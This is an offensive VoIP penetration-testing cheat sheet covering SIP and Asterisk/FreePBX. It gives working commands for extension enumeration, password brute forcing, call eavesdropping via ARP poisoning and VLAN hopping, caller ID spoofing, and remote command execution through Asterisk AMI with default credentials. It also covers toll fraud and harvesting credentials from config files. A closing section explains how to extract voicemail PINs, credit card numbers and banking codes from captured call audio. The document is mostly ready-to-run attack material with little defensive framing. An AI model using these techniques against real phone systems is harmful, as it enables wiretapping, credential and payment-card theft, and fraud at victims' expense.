#SIP #VoIP #telephony #SIPvicious #RTP #Asterisk #FreePBX #IVR

## What is SIP/VoIP?
Session Initiation Protocol — signaling protocol for initiating, maintaining, and terminating real-time sessions (voice, video, messaging). Underpins enterprise telephone systems (PBX), UC platforms (Teams, Cisco UCM, Avaya, Asterisk/FreePBX). Attack surface: extension enumeration, credential brute force, eavesdropping, VLAN hopping, toll fraud, and web admin panel exploitation.

### Ports

| Port | Protocol | Service |
|---|---|---|
| UDP/TCP **5060** | SIP | Signaling (plaintext) |
| UDP/TCP **5061** | SIPS | SIP over TLS |
| UDP **4569** | IAX2 | Inter-Asterisk eXchange (Asterisk) |
| TCP **1720** | H.323 | Legacy VoIP signaling |
| TCP **2000** | SCCP | Cisco Skinny Client Control Protocol |
| UDP **2427** | MGCP | Media Gateway Control Protocol |
| UDP **10000–20000** | RTP | Media streams (audio/video) |
| TCP **80/8080/443** | HTTP/S | FreePBX, Asterisk web UI |
| TCP **5038** | AMI | Asterisk Manager Interface |

---

## Tools

```bash
# SIPVicious suite — primary VoIP pentest toolkit
pip install sipvicious
# or: apt install sipvicious

# svmap    — SIP host/device scanner
# svwar    — extension/user enumeration
# svcrack  — SIP credential brute forcer
# svreport — manage scan reports
# svlearndb — manage DB results

# sngrep — SIP traffic monitor/capture (TUI)
apt install sngrep
sngrep

# sipsak — SIP swiss army knife
apt install sipsak

# nmap SIP scripts
nmap -sU -p 5060 --script sip-enum-users,sip-methods host

# Wireshark — RTP stream capture and audio reconstruction
# Telephony → VoIP Calls → select call → Play Streams

# Metasploit SIP modules
search type:auxiliary sip
```

---

## Enumeration

```bash
# Nmap — SIP service detection
nmap -sU -p 5060 --script sip-enum-users,sip-methods -sV <target>
nmap -sU -p 5060,5061,4569 -sV <target>
nmap -p 5060 --script sip-methods <target>   # list supported methods

# svmap — scan for SIP devices
svmap <target>
svmap <subnet>/24
svmap -p 5060 <target>
svmap --fp <target>      # fingerprint (identify PBX vendor/version)

# Manual OPTIONS fingerprint (no auth required)
sipsak -s sip:<target> -v
# or:
echo -e "OPTIONS sip:<target> SIP/2.0\r\nVia: SIP/2.0/UDP attacker:5060\r\nMax-Forwards: 70\r\nFrom: sip:attacker@attacker\r\nTo: sip:<target>\r\nCall-ID: 1234@attacker\r\nCSeq: 1 OPTIONS\r\nContact: sip:attacker@attacker\r\nContent-Length: 0\r\n\r\n" | nc -u -w 2 <target> 5060

# Check IAX2 (Asterisk)
nmap -sU -p 4569 -sV <target>

# Check AMI (Asterisk Manager Interface)
nmap -p 5038 -sV <target>
nc <target> 5038   # banner reveals Asterisk version
```

---

## Extension / User Enumeration

Extensions are phone numbers assigned to users (e.g., 100–299). Valid vs invalid extensions return different SIP response codes.

```bash
# svwar — enumerate extensions via REGISTER or OPTIONS
svwar -e100-999 <target>                    # try extensions 100-999
svwar -e100-999 -m REGISTER <target>        # use REGISTER method
svwar -e100-999 -m OPTIONS <target>         # use OPTIONS method (stealthier)
svwar -e100-999 --fp <target>              # with fingerprinting

# Response codes:
# 200 OK / 401 Unauthorized = extension EXISTS
# 403 Forbidden             = extension EXISTS (but blocked)
# 404 Not Found             = extension does not exist

# nmap SIP user enum
nmap -sU -p 5060 --script sip-enum-users \
  --script-args sip-enum-users.userdb=/usr/share/seclists/Usernames/sip-extensions.txt <target>

# Manual REGISTER (single extension)
sipsak -s sip:100@<target> -U -C sip:attacker@attacker -r 5060
```

---

## Credential Brute Force

```bash
# svcrack — brute force SIP passwords for enumerated extensions
svcrack -u 200 -d /usr/share/wordlists/rockyou.txt <target>
svcrack -u 200 -d /usr/share/wordlists/rockyou.txt -m INVITE <target>

# Brute force multiple extensions
for ext in 100 101 102 200 201 300; do
  echo "Testing ext $ext..."
  svcrack -u $ext -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt <target>
done

# Common default passwords for VoIP extensions:
# extension number itself (e.g., ext 200 → password 200)
# 1234, 0000, 1111, admin, password
# Last 4 of phone number

# Hydra (alternative)
hydra -l 100 -P /usr/share/wordlists/rockyou.txt sip://<target>
```

---

## Attack Vectors

### Eavesdropping — RTP Stream Capture

SIP is the signaling layer. RTP carries the actual audio — often unencrypted.

```bash
# Capture SIP + RTP traffic (requires network access — MiTM, same VLAN, etc.)
sudo tcpdump -i eth0 -w voip_capture.pcap udp port 5060 or udp portrange 10000-20000

# In Wireshark:
# 1. Open pcap
# 2. Telephony → VoIP Calls
# 3. Select call → Flow Sequence (see SIP handshake)
# 4. Select call → Play Streams (reconstructs audio)
# 5. Save as .au or .wav

# sngrep — live SIP traffic monitor
sudo sngrep -I voip_capture.pcap   # from pcap
sudo sngrep                         # live capture
# Shows call flows, allows selecting and exporting

# rtpdump — extract RTP from pcap
rtpdump -F payload -o audio.raw <src_ip>/<src_port> voip_capture.pcap
sox -r 8000 -e a-law -c 1 audio.raw audio.wav   # convert to wav (G.711 alaw)
```

### Caller ID Spoofing

SIP `From` header is not authenticated in most deployments.

```bash
# Send INVITE with spoofed caller ID
sipsak -s sip:<target_ext>@<target> \
  -H "From: \"CEO\" <sip:ceo@company.com>" \
  -r 5060 -v

# Via Asterisk (if you have AMI access)
# In dialplan or via AMI, set CALLERID(name) and CALLERID(num) arbitrarily

# Metasploit — SIP INVITE spoof
use auxiliary/voip/sip_invite_spoof
set RHOSTS <target>
set SRCADDR <spoofed_ip>
run
```

### VoIP VLAN Hopping

Enterprise VoIP phones are often on a dedicated VLAN advertised via CDP/LLDP. If an attacker port has access, they can hop into the VoIP VLAN to sniff calls.

```bash
# Discover VoIP VLAN via CDP (Cisco Discovery Protocol)
tcpdump -i eth0 -nn -v "ether[12:2] == 0x2000"   # CDP packets
# Look for: Voice VLAN ID in CDP TLV

# voiphopper — automated VoIP VLAN hopping
voiphopper -i eth0 -c 0        # CDP sniff mode
voiphopper -i eth0 -v <vlan_id>  # manual VLAN

# After hopping onto VoIP VLAN — sniff RTP
sudo tcpdump -i eth0.200 -w calls.pcap udp portrange 10000-20000
```

### SIP Registration Hijacking (MiTM)

If you can perform a MiTM on SIP traffic (same subnet, ARP poison), you can re-register a victim extension to your device and intercept calls.

```bash
# ARP poison between VoIP phone and PBX
sudo arpspoof -i eth0 -t <phone_ip> <pbx_ip>
sudo arpspoof -i eth0 -t <pbx_ip> <phone_ip>

# Capture credentials in SIP REGISTER (MD5 challenge-response)
sudo tcpdump -i eth0 -w sip.pcap port 5060

# Extract SIP digest auth from pcap
grep -oP 'response="\K[^"]+' sip.pcap   # MD5 hash from Digest auth

# Crack SIP digest hash
# Format: username:realm:password (MD5)
# Use sipcrack or hashcat mode 11400
hashcat -m 11400 digest_hashes.txt /usr/share/wordlists/rockyou.txt
sipcrack <target> -w /usr/share/wordlists/rockyou.txt
```

### Asterisk Manager Interface (AMI) — Remote Code Execution

AMI on TCP 5038 allows management commands. Default credentials are common.

```bash
# Connect to AMI
nc <target> 5038
# Banner: Asterisk Call Manager/x.x

# Authenticate
Action: Login
Username: admin
Secret: admin

# Execute OS command via AMI (if admin)
Action: AGI
Channel: SIP/100
Command: EXEC System "id > /tmp/out.txt"

# Originate call to run dialplan (pivot)
Action: Originate
Channel: SIP/100
Context: default
Exten: 1000
Priority: 1
Async: true

# Metasploit
use exploit/multi/misc/asterisk_ami_cmd
set RHOSTS <target>
set RPORT 5038
set USERNAME admin
set PASSWORD admin
run
```

### FreePBX / Asterisk Web Interface

```bash
# Common paths
http://<target>/admin/
http://<target>/freepbx/
http://<target>/admin/config.php

# Default credentials
admin / admin
admin / (blank)
admin / freepbx

# FreePBX RCE — CVE-2014-7235 (command injection in recordings)
# CVE-2019-19006 (admin auth bypass)
# Metasploit
use exploit/unix/webapp/freepbx_config_php_rce
set RHOSTS <target>
run

# After admin access — System Admin module → Command execution
# or: Admin → Config Edit → edit dialplan files
```

### Toll Fraud

Compromised PBX used to make premium-rate or international calls at victim's expense.

```bash
# After obtaining SIP credentials or AMI access:
# Register as the extension and place outbound calls

# Via AMI — originate international call
Action: Originate
Channel: SIP/<provider>/<international_number>
Context: outbound
Exten: s
Priority: 1

# Via SIP registration (using stolen creds)
# Register attacker's softphone as extension
# Place calls through the compromised trunk

# Assess outbound dial rules (is international calling allowed?)
# Check: /etc/asterisk/extensions.conf for dial patterns
```

### IVR Bypass / Navigation

Interactive Voice Response systems can expose internal options if not properly secured.

```bash
# Connect to IVR and probe menu options
# Common bypasses:
# - Press 0 or * repeatedly to reach operator
# - Dial internal extension directly (0 + ext)
# - Long silence to trigger timeout → transfer to agent
# - Enter invalid input repeatedly → escalate to live agent

# Test for voicemail default PINs
# Many voicemail systems: PIN = extension number
# Dial extension voicemail → enter 1234, 0000, extension#

# Toll-free number recon: company auto-attendant can reveal:
# - Extension ranges (dial-by-name directory)
# - Internal org structure
# - Callback numbers and departments
```

---

## Post-Compromise

```bash
# Asterisk config — credentials, trunk configs, voicemail passwords
cat /etc/asterisk/sip.conf          # SIP peer credentials + trunk configs
cat /etc/asterisk/extensions.conf   # dialplan
cat /etc/asterisk/voicemail.conf    # voicemail passwords
cat /etc/asterisk/manager.conf      # AMI credentials
find /etc/asterisk -name "*.conf" | xargs grep -i "secret\|password\|pass"

# FreePBX database (MySQL) — all extension + voicemail data
mysql -u freepbxuser -p freepbx
SELECT * FROM sip;
SELECT * FROM users;
SELECT * FROM voicemail;

# Voicemail files (audio .wav/.gsm files — may contain sensitive messages)
find /var/spool/asterisk/voicemail -name "*.wav" -o -name "*.gsm"

# Call recording files
find /var/spool/asterisk/monitor -name "*.wav"
ls /var/spool/asterisk/recording/
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| SIP on UDP 5060 without auth | Extension enumeration without credentials |
| Weak extension passwords (= extension number) | Trivial brute force → toll fraud |
| AMI exposed on network with default creds | Remote command execution |
| No SRTP (unencrypted RTP) | Call eavesdropping |
| No SIP TLS | Credential and signaling interception |
| FreePBX admin UI exposed | Web-based RCE |
| Permissive outbound dial rules | Toll fraud via compromised extension |
| VoIP VLAN accessible from data VLAN | VLAN hop → call interception |

---

## Quick Reference

| Goal | Command |
|---|---|
| Scan for SIP | `svmap <target>` / `nmap -sU -p 5060 -sV target` |
| Extension enum | `svwar -e100-999 <target>` |
| Brute force ext | `svcrack -u 200 -d rockyou.txt <target>` |
| Live SIP monitor | `sudo sngrep` |
| Capture calls | `tcpdump -i eth0 -w calls.pcap udp port 5060 or udp portrange 10000-20000` |
| Reconstruct audio | Wireshark → Telephony → VoIP Calls → Play Streams |
| AMI connect | `nc host 5038` → `Action: Login` |
| Crack SIP digest | `hashcat -m 11400 hashes.txt rockyou.txt` |
| FreePBX config | `cat /etc/asterisk/sip.conf` |
| VoIP VLAN hop | `voiphopper -i eth0 -c 0` |

---

## DTMF Extraction from Captured Calls

DTMF (Dual-Tone Multi-Frequency) tones are what you hear when pressing phone keys. In captured VoIP traffic they contain: voicemail PINs, IVR credit card numbers, account numbers, access codes. Two transmission methods — check both.

### Method 1 — RFC 2833 / RFC 4733 (Telephone-Event RTP Packets)

Modern VoIP sends DTMF as discrete RTP events (payload type 101 by default) rather than audio tones. Digits are in plaintext in the RTP payload — no audio decoding needed.

```bash
# In Wireshark — filter for telephone-event packets
# Filter: rtp.p_type == 101
# Or:     rtpevent

# Read DTMF events directly from packet details:
# RTP → Payload Type: telephone-event (101)
# RTP Payload → Event: 1 (= digit "1"), Event: 5 (= digit "5"), etc.

# Extract all DTMF events from pcap via tshark
tshark -r capture.pcap -Y "rtp.p_type == 101" -T fields   -e frame.number -e ip.src -e ip.dst -e rtpevent.event_id

# Event IDs map to digits:
# 0-9 = digits 0-9
# 10 = *
# 11 = #
# 12-15 = A-D (rarely used)

# One-liner to print just the digit sequence
tshark -r capture.pcap -Y "rtp.p_type == 101 && rtpevent.end_of_event == 1"   -T fields -e rtpevent.event_id | tr '\n' ' '
# rtpevent.end_of_event == 1 filters to one event per key press (avoids duplicates)
```

### Method 2 — In-Band Audio Tone Decoding (multimon-ng)

Older systems or PSTN gateways transmit DTMF as actual audio tones in the RTP stream. Requires extracting audio then running a tone decoder.

```bash
# Install multimon-ng
apt install multimon-ng

# Full pipeline: pcap → raw audio → DTMF decode

# Step 1: Extract RTP stream from pcap (Wireshark)
# Telephony → VoIP Calls → select call → Player → Save → raw audio
# Or via RTP stream analysis: Telephony → RTP → RTP Streams → select → Save payload

# Step 2: Convert raw audio to wav (adjust encoding for codec used)
# G.711 u-law (common North America)
sox -r 8000 -e u-law -c 1 audio.raw audio.wav

# G.711 a-law (common Europe)
sox -r 8000 -e a-law -c 1 audio.raw audio.wav

# Step 3: Decode DTMF tones
multimon-ng -t wav -a DTMF audio.wav

# Combined pipeline (no intermediate file)
sox -r 8000 -e u-law -c 1 audio.raw -t wav - | multimon-ng -t wav -a DTMF -

# Output example:
# DTMF: 4
# DTMF: 1
# DTMF: 2
# DTMF: 3  →  PIN entered was 4123

# From live audio device (capture in real time)
sox -t alsa default -t wav - | multimon-ng -t wav -a DTMF -
```

### Wireshark — DTMF in VoIP Call Analysis

```bash
# Wireshark built-in DTMF display:
# Telephony → VoIP Calls → select call → Flow Sequence
# Look for: DTMF digit packets in the flow (shown as telephony events)

# Telephony → RTP → RTP Streams → Analyze
# Shows packet details including telephone-event payloads

# Extract and play audio with Wireshark GUI:
# Telephony → VoIP Calls → Play Streams
# While playing, DTMF events are annotated in the timeline

# Export RTP payload for multimon-ng:
# Telephony → RTP → RTP Streams → select stream → Save payload (raw)
```

### What to Listen/Look For

```
# High-value DTMF sequences to capture from IVR/voicemail calls:
# - Voicemail PIN (user dials extension + enters PIN)
# - IVR credit card entry (16 digits + expiry + CVV)
# - Banking IVR account numbers + PINs
# - Conference call access codes
# - Building/alarm access codes entered over phone
# - Remote access codes for PBX admin menus

# IVR admin menus (Asterisk example):
# Dial *97 or *98 → voicemail admin → DTMF PIN
# Dial feature codes → DTMF sequences reveal enabled features
```

### Additional DTMF Decoder Tools

```bash
# dtmf2num — simple dedicated DTMF extractor
# Reads raw/wav audio, outputs digit sequence
apt install dtmf2num   # may need to build from source
dtmf2num audio.wav
dtmf2num -f raw -r 8000 audio.raw   # raw PCM input

# Convert RTP payload first if needed
sox -r 8000 -e u-law -c 1 rtp_payload.raw -t wav audio.wav
dtmf2num audio.wav

# Audacity — visual DTMF identification via spectrogram
# Open audio file → View → Spectrogram
# DTMF tones appear as paired horizontal frequency bands:
# Row freq (Hz): 697, 770, 852, 941
# Col freq (Hz): 1209, 1336, 1477, 1633
# Identify digit by which row+col pair lights up
# Useful when audio quality is too low for automated decoding

# Python — Goertzel algorithm DTMF detection
pip install dtmf
python3 -c "
import dtmf
digits = dtmf.decode_file('audio.wav')
print('DTMF digits:', ''.join(digits))
"

# scipy-based manual approach (no extra deps)
python3 << 'PYEOF'
import numpy as np
from scipy.io import wavfile
from scipy.signal import spectrogram

rate, data = wavfile.read('audio.wav')
if data.ndim > 1:
    data = data[:, 0]

# DTMF frequency pairs
row_freqs = [697, 770, 852, 941]
col_freqs = [1209, 1336, 1477, 1633]
dtmf_map = {
    (697,1209):'1',(697,1336):'2',(697,1477):'3',(697,1633):'A',
    (770,1209):'4',(770,1336):'5',(770,1477):'6',(770,1633):'B',
    (852,1209):'7',(852,1336):'8',(852,1477):'9',(852,1633):'C',
    (941,1209):'*',(941,1336):'0',(941,1477):'#',(941,1633):'D',
}

def goertzel(samples, freq, rate):
    n = len(samples)
    k = int(0.5 + n * freq / rate)
    w = 2 * np.pi * k / n
    coeff = 2 * np.cos(w)
    s1, s2 = 0.0, 0.0
    for sample in samples:
        s0 = sample + coeff * s1 - s2
        s2, s1 = s1, s0
    return s2**2 + s1**2 - coeff * s1 * s2

chunk = rate // 10  # 100ms chunks
digits = []
for i in range(0, len(data) - chunk, chunk):
    block = data[i:i+chunk].astype(float)
    row = max(row_freqs, key=lambda f: goertzel(block, f, rate))
    col = max(col_freqs, key=lambda f: goertzel(block, f, rate))
    if goertzel(block, row, rate) > 1e10 and goertzel(block, col, rate) > 1e10:
        d = dtmf_map.get((row, col))
        if d and (not digits or digits[-1] != d):
            digits.append(d)

print('Digits:', ''.join(digits))
PYEOF

# sox — frequency analysis (verify DTMF tones present)
sox audio.wav -n stat 2>&1 | grep -i "freq"
sox audio.wav -n spectrogram -o spec.png   # visual spectrogram output

# tshark — extract RFC 2833 events without Wireshark GUI
tshark -r capture.pcap -Y "rtp.p_type == 101 && rtpevent.end_of_event == 1"   -T fields -e frame.time -e ip.src -e ip.dst -e rtpevent.event_id 2>/dev/null

# Map event IDs to characters
tshark -r capture.pcap -Y "rtp.p_type == 101 && rtpevent.end_of_event == 1"   -T fields -e rtpevent.event_id 2>/dev/null | python3 -c "
import sys
m = {str(i):str(i) for i in range(10)}
m.update({'10':'*','11':'#','12':'A','13':'B','14':'C','15':'D'})
print(''.join(m.get(l.strip(),'?') for l in sys.stdin if l.strip()))
"
```

### ribt/dtmf-decoder

Python tool specifically built for extracting phone numbers/PINs from audio recordings of dial tones. Uses FFT to analyze frequency pairs per frame. Cleaner output than multimon-ng for this specific use case.

```bash
# Install
git clone https://github.com/ribt/dtmf-decoder
cd dtmf-decoder
pip install -r requirements.txt   # numpy, scipy, matplotlib

# Basic usage (WAV input)
python3 dtmf.py audio.wav

# Show full timeline (when each digit was pressed + duration)
python3 dtmf.py -v audio.wav

# Stereo recordings — decode left or right channel only
python3 dtmf.py -l audio.wav   # left channel
python3 dtmf.py -r audio.wav   # right channel

# Tune detection sensitivity
python3 dtmf.py -t 30 audio.wav   # frequency tolerance ±30 Hz (default: 20)
python3 dtmf.py -i 0.02 audio.wav # frame interval 0.02s (default: 0.05)

# Debug — show FFT graphs to visualize frequency detection
python3 dtmf.py -d audio.wav

# Convert formats to WAV first
ffmpeg -i capture.mp3 audio.wav
ffmpeg -i capture.ogg audio.wav

# From RTP pcap → WAV → dtmf-decoder (full pipeline)
# Step 1: Extract RTP audio from pcap (Wireshark: Telephony → RTP → Save payload)
# Step 2: Convert raw RTP to WAV
sox -r 8000 -e u-law -c 1 rtp_payload.raw audio.wav   # G.711 ulaw
sox -r 8000 -e a-law -c 1 rtp_payload.raw audio.wav   # G.711 alaw
# Step 3: Decode
python3 dtmf.py -v audio.wav
```
